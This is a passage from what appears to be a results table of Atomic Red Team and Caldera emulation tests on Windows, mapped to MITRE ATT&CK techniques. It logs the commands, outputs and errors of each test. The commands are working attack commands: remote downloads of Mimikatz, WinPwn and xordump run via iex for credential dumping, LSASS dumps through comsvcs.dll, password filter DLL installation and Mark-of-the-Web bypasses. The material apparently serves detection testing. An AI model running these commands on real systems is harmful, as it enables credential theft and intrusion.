Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""]","['Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\""access denied\\"" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen ""ERROR kuhl_m_sekurlsa_acquireLSA""\n']",['Powershell Mimikatz'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: LSASS Memory', 'technique_id': 'T1003.001'}]",['windows'],['psh']
547,Initial-Success,credential-access,credential-access :: OS Credential Dumping: LSASS Memory,credential-access :: ['Dump LSASS.exe using imported Microsoft DLLs'],credential-access :: T1003.001,operation__atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__36fc42ced381416ca7d5d7af0ee0561b__SAVED_2024-03-06_172710,atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__36fc42ced381416ca7d5d7af0ee0561b,['36fc42ced381416ca7d5d7af0ee0561b'],1,0,1,[1],['File written to C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmpXor key: 0'],[''],['0'],"['if (Test-Path \'C:\\Windows\\Temp\\xordump.exe\') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest ""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41']","['The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n']",['Dump LSASS.exe using imported Microsoft DLLs'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: LSASS Memory', 'technique_id': 'T1003.001'}]",['windows'],['psh']
548,Initial-Success,credential-access,credential-access :: OS Credential Dumping: LSASS Memory,credential-access :: ['Dump LSASS.exe Memory using comsvcs.dll'],credential-access :: T1003.001,operation__atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__SAVED_2024-03-06_172031,atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7,['35d92515122effdd73801c6ac3021da7'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full']","['The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n']",['Dump LSASS.exe Memory using comsvcs.dll'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: LSASS Memory', 'technique_id': 'T1003.001'}]",['windows'],['psh']
2,Fixed,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Bypass ExecutionPolicy'],defense-evasion :: T1562.001,operation__stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e__SAVED_2024-03-10_111606,stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e,['3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e'],1,0,0,[1],[''],"[""Set-ItemProperty : Cannot find path 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell' because it does not exist.At line:1 char:1+ Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Powe ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...dows\\PowerShell:String) [Set-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand You cannot call a method on a null-valued expression.At line:1 char:121+ ... ass;        $shell = New-Object -ComObject Wscript.Shell        Set-E ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull ""]",['1'],"['Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;        $shell = New-Object -ComObject Wscript.Shell        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(""Y`r`n"")']",['Ensure the ExecutionPolicy is turned to Bypass'],['Bypass ExecutionPolicy'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
86,Fixed,command-and-control,command-and-control :: Protocol Tunneling,command-and-control :: ['DNS over HTTPS Regular Beaconing'],command-and-control :: T1572,operation__atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__45f462c09f28d5b0819af7b1ed0913e1__SAVED_2024-03-09_112621,atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__45f462c09f28d5b0819af7b1ed0913e1,['45f462c09f28d5b0819af7b1ed0913e1'],1,0,0,[1],[''],"['Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\' because it does not exist.At line:1 char:1+ Set-Location ""PathToAtomicsFolder""; .\\T1572\\src\\T1572-doh-domain-leng ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ToAtomicsFolder:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\T1572\\src\\T1572-doh-domain-length.ps1 : The term \'.\\T1572\\src\\T1572-doh-domain-length.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:37+ ... PathToAtomicsFolder""; .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohSer ...+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\T1572\\src\\T1572-doh-domain-length.ps1:String) [], CommandNotFoundExce    ption    + FullyQualifiedErrorId : CommandNotFoundException ']",['1'],"['Set-Location ""PathToAtomicsFolder""; .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer']","['This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.\n']",['DNS over HTTPS Long Domain Query'],"[{'tactic': 'command-and-control', 'technique_name': 'Protocol Tunneling', 'technique_id': 'T1572'}]",['windows'],['psh']
113,Fixed,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Tamper with Windows Defender Evade Scanning -Process'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__cb6e6c7e18aba2207c696368f8edb23a__SAVED_2024-03-09_070941,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__cb6e6c7e18aba2207c696368f8edb23a,['cb6e6c7e18aba2207c696368f8edb23a'],1,0,0,[1],[''],"['New-ItemProperty : Cannot find path \'HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\' because it does not exist.At line:1 char:1+ New-ItemProperty ""HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE"" -Na ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...ft\\Windows\\OOBE:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']",['1'],"['New-ItemProperty ""HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE"" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force']",['LockBit Black - Disable Privacy Settings Experience Using Registry\n'],['LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
125,Fixed,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Uninstall Crowdstrike Falcon on Windows'],defense-evasion :: T1562.001,operation__atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__4df316c222125fe7372723c5b3434977__SAVED_2024-03-09_060805,atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__4df316c222125fe7372723c5b3434977,['4df316c222125fe7372723c5b3434977'],1,0,0,[1],[''],"['New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:1+ New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\Curren ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:147+ ... e 1 -Force; New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windo ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:286+ ... tor -Force; New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windo ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand New-ItemProperty : Cannot find path \'HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' because it does not exist.At line:1 char:425+ ... com -Force; New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windo ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKLM:\\Software\\...ersion\\Winlogon:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']",['1'],"['New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force; New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"" -Name DefaultUserName -Value Administrator -Force; New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"" -Name DefaultDomainName -Value contoso.com -Force; New-ItemProperty ""HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"" -Name DefaultPassword  -Value password1 -Force']",['Lockbit Black - Use Registry Editor to turn on automatic logon\n'],['Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
141,Fixed,credential-access,credential-access :: Credentials from Password Stores,credential-access :: ['WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords'],credential-access :: T1555,operation__atomic_windows_depfalse_pshtrue__t1556_002__multiple__modify_authentication_process-_password_filter_dll__cc7f0eb8b9115b271eaaa42c9b6f3dca__SAVED_2024-03-09_032828,atomic_windows_depfalse_pshtrue__t1556_002__multiple__modify_authentication_process-_password_filter_dll__cc7f0eb8b9115b271eaaa42c9b6f3dca,['cc7f0eb8b9115b271eaaa42c9b6f3dca'],1,1,1,[0],[''],"['ERROR: Unable to write to the file. There may be a disk or file system error.Copy-Item : Cannot find path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\' because it does not exist.At line:1 char:130+ ... lterName = (Copy-Item ""PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTea ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...eamPWFilter.dll:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['0'],"['reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ ""PathToAtomicsFolder\\T1556.002\\lsa_backup.reg""; $passwordFilterName = (Copy-Item ""PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll"" -Destination ""C:\\Windows\\System32"" -PassThru).basename; $lsaKey = Get-Item ""HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\""; $notificationPackagesValues = $lsaKey.GetValue(""Notification Packages""); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty ""HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"" ""Notification Packages"" $notificationPackagesValues']","['Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n']",['Install and Register Password Filter DLL'],"[{'tactic': 'multiple', 'technique_name': 'Modify Authentication Process: Password Filter DLL', 'technique_id': 'T1556.002'}]",['windows'],['psh']
142,Fixed,credential-access,credential-access :: Credentials from Password Stores,credential-access :: ['Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]'],credential-access :: T1555,operation__atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__f6867f2b9b1b3c2eb733ad7ce7438f04__SAVED_2024-03-09_032148,atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__f6867f2b9b1b3c2eb733ad7ce7438f04,['f6867f2b9b1b3c2eb733ad7ce7438f04'],1,0,1,[1],"['Looking for Registry entries on this system:No Teamviewer installed, sorry']",[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); decryptteamviewer -consoleoutput -noninteractive""]",['Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn'],['WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores', 'technique_id': 'T1555'}]",['windows'],['psh']
155,Fixed,credential-access,credential-access :: Credentials from Password Stores: Credentials from Web Browsers,credential-access :: ['BrowserStealer (Chrome / Firefox / Microsoft Edge)'],credential-access :: T1555.003,operation__atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__abeb340acb3e1236c6919339942e7c77__SAVED_2024-03-09_015452,atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__abeb340acb3e1236c6919339942e7c77,['abeb340acb3e1236c6919339942e7c77'],1,0,0,[1],[''],"['Stop-Process : Cannot find a process with the name ""WebBrowserPassView"". Verify the process name and call the cmdlet again.At line:1 char:71+ ... .exe""; Start-Sleep -Second 4; Stop-Process -Name ""WebBrowserPassView""+                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (WebBrowserPassView:String) [Stop-Process], ProcessCommandException    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand ']",['1'],"['Start-Process ""f3d204_WebBrowserPassView.exe""; Start-Sleep -Second 4; Stop-Process -Name ""WebBrowserPassView""']",['The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.'],['WebBrowserPassView - Credentials from Browser'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores: Credentials from Web Browsers', 'technique_id': 'T1555.003'}]",['windows'],['psh']
160,Fixed,credential-access,credential-access :: Credentials from Password Stores: Credentials from Web Browsers,credential-access :: ['Stage Popular Credential Files for Exfiltration'],credential-access :: T1555.003,operation__atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__679ef375ad2b361965500392419d084c__SAVED_2024-03-09_014129,atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__679ef375ad2b361965500392419d084c,['679ef375ad2b361965500392419d084c'],1,0,0,[1],[''],"['Copy-Item : Cannot find path \'C:\\Users\\puma-4\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\\' because it does not exist.At line:1 char:1+ Copy-Item ""$env:APPDATA\\Mozilla\\Firefox\\Profiles\\"" -Destination ""Path ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...refox\\Profiles\\:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['1'],"['Copy-Item ""$env:APPDATA\\Mozilla\\Firefox\\Profiles\\"" -Destination ""PathToAtomicsFolder\\..\\ExternalPayloads"" -Force -Recurse']","[""Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n""]",['Simulating access to Windows Firefox Login Data'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores: Credentials from Web Browsers', 'technique_id': 'T1555.003'}]",['windows'],['psh']
162,Fixed,defense-evasion,defense-evasion :: Subvert Trust Controls: Mark-of-the-Web Bypass,defense-evasion :: ['Execute LNK file from ISO'],defense-evasion :: T1553.005,operation__atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1cca72410c2849070d833700fcc30c59__SAVED_2024-03-09_011449,atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1cca72410c2849070d833700fcc30c59,['1cca72410c2849070d833700fcc30c59'],1,0,0,[1],[''],"['Copy-Item : Cannot find path \'C:\\Users\\puma-4\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data\' because it does not exist.At line:1 char:1+ Copy-Item ""$env:APPDATA\\Opera Software\\Opera Stable\\Login Data"" -Dest ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...able\\Login Data:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['1'],"['Copy-Item ""$env:APPDATA\\Opera Software\\Opera Stable\\Login Data"" -Destination ""PathToAtomicsFolder\\..\\ExternalPayloads""']","[""Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n""]",['Simulating access to Opera Login Data'],"[{'tactic': 'credential-access', 'technique_name': 'Credentials from Password Stores: Credentials from Web Browsers', 'technique_id': 'T1555.003'}]",['windows'],['psh']
163,Fixed,defense-evasion,defense-evasion :: Subvert Trust Controls: Mark-of-the-Web Bypass,defense-evasion :: ['Mount an ISO image and run executable from the ISO'],defense-evasion :: T1553.005,operation__atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__d2e0c0165046372fcd5e2bf910eeb477__SAVED_2024-03-09_010126,atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__d2e0c0165046372fcd5e2bf910eeb477,['d2e0c0165046372fcd5e2bf910eeb477'],1,0,0,[124],"['Timeout reached, process killed']","['Mount-DiskImage : The system cannot find the file specified. At line:1 char:1+ Mount-DiskImage -ImagePath ""053c10_AllTheThings.iso"" -StorageType ISO ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (MSFT_DiskImage:ROOT/Microsoft/.../MSFT_DiskImage) [Mount-DiskImage], Ci    mException    + FullyQualifiedErrorId : HRESULT 0x80070002,Mount-DiskImage Get-Volume : No MSFT_Volume objects found with property \'FileSystemLabel\' equal to \'AllTheThings\'.  Verify the value of the property and retry.At line:1 char:97+ ...  ReadOnly; $keep = Get-Volume -FileSystemLabel ""AllTheThings""; $drive ...+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (AllTheThings:String) [Get-Volume], CimJobException    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_FileSystemLabel,Get-Volume ']",['-1'],"['Mount-DiskImage -ImagePath ""053c10_AllTheThings.iso"" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel ""AllTheThings""; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(""{c08afd90-f2a1-11d1-8455-00a0c91f3880}"")); $instance.Document.Application.ShellExecute($driveLetter+"":\\document.lnk"","""",$driveLetter+"":\\"",$null,0)']",['Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n'],['Execute LNK file from ISO'],"[{'tactic': 'defense-evasion', 'technique_name': 'Subvert Trust Controls: Mark-of-the-Web Bypass', 'technique_id': 'T1553.005'}]",['windows'],['psh']
164,Fixed,defense-evasion,defense-evasion :: Subvert Trust Controls: Mark-of-the-Web Bypass,defense-evasion :: ['Remove the Zone.Identifier alternate data stream'],defense-evasion :: T1553.005,operation__atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__9b3194cc656092b09f4d79ba3d3a3277__SAVED_2024-03-09_005445,atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__9b3194cc656092b09f4d79ba3d3a3277,['9b3194cc656092b09f4d79ba3d3a3277'],1,0,0,[1],[''],"['Mount-DiskImage : The system cannot find the file specified. At line:1 char:1+ Mount-DiskImage -ImagePath ""0f959a_FeelTheBurn.iso"" -StorageType ISO  ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (MSFT_DiskImage:ROOT/Microsoft/.../MSFT_DiskImage) [Mount-DiskImage], Ci    mException    + FullyQualifiedErrorId : HRESULT 0x80070002,Mount-DiskImage Get-Volume : No MSFT_Volume objects found with property \'FileSystemLabel\' equal to \'TestIso\'.  Verify the value of the property and retry.At line:1 char:96+ ... ccess ReadOnly; $keep = Get-Volume -FileSystemLabel ""TestIso""; $drive ...+                             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (TestIso:String) [Get-Volume], CimJobException    + FullyQualifiedErrorId : CmdletizationQuery_NotFound_FileSystemLabel,Get-Volume invoke-item : Cannot find path \'C:\\Users\\puma-4\\Desktop\\:\\hello.exe\' because it does not exist.At line:1 char:184+ ... p | Get-Volume).DriveLetter; invoke-item ""$($driveLetter):\\hello.exe""+                                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\:\\hello.exe:String) [Invoke-Item], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.InvokeItemCommand ']",['1'],"['Mount-DiskImage -ImagePath ""0f959a_FeelTheBurn.iso"" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel ""TestIso""; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item ""$($driveLetter):\\hello.exe""']","['Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing ""Hello, World!"". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ']",['Mount an ISO image and run executable from the ISO'],"[{'tactic': 'defense-evasion', 'technique_name': 'Subvert Trust Controls: Mark-of-the-Web Bypass', 'technique_id': 'T1553.005'}]",['windows'],['psh']
165,Fixed,defense-evasion,defense-evasion :: Subvert Trust Controls: Mark-of-the-Web Bypass,defense-evasion :: ['Mount ISO image'],defense-evasion :: T1553.005,operation__atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__7f0f5471543a6f188b0fbdc436c49fd9__SAVED_2024-03-09_004802,atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__7f0f5471543a6f188b0fbdc436c49fd9,['7f0f5471543a6f188b0fbdc436c49fd9'],1,0,0,[1],[''],"[""Unblock-File : Cannot find path 'C:\\Users\\puma-4\\AppData\\Local\\Temp\\ReadMe.md' because it does not exist.At line:1 char:1+ Unblock-File -Path $env:tmp\\ReadMe.md+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...\\Temp\\ReadMe.md:String) [Unblock-File], ItemNotFoundE    xception    + FullyQualifiedErrorId : FileNotFound,Microsoft.PowerShell.Commands.UnblockFileCommand ""]",['1'],['Unblock-File -Path $env:tmp\\ReadMe.md'],['Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n'],['Remove the Zone.Identifier alternate data stream'],"[{'tactic': 'defense-evasion', 'technique_name': 'Subvert Trust Controls: Mark-of-the-Web Bypass', 'technique_id': 'T1553.005'}]",['windows'],['psh']
166,Fixed,defense-evasion,defense-evasion :: Subvert Trust Controls: Install Root Certificate,defense-evasion :: ['Install root CA on Windows'],defense-evasion :: T1553.004,operation__atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__3c9dee6c65974cc3b4f34d0a5d1b6992__SAVED_2024-03-09_004120,atomic_windows_depfalse_pshtrue__t1553_005__defense-evasion__subvert_trust_controls-_mark-of-the-web_bypass__3c9dee6c65974cc3b4f34d0a5d1b6992,['3c9dee6c65974cc3b4f34d0a5d1b6992'],1,0,0,[1],[''],"['Mount-DiskImage : The system cannot find the file specified. At line:1 char:1+ Mount-DiskImage -ImagePath ""5fad3e_T1553.005.iso""+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (MSFT_DiskImage:ROOT/Microsoft/.../MSFT_DiskImage) [Mount-DiskImage], Ci    mException    + FullyQualifiedErrorId : HRESULT 0x80070002,Mount-DiskImage ']",['1'],"['Mount-DiskImage -ImagePath 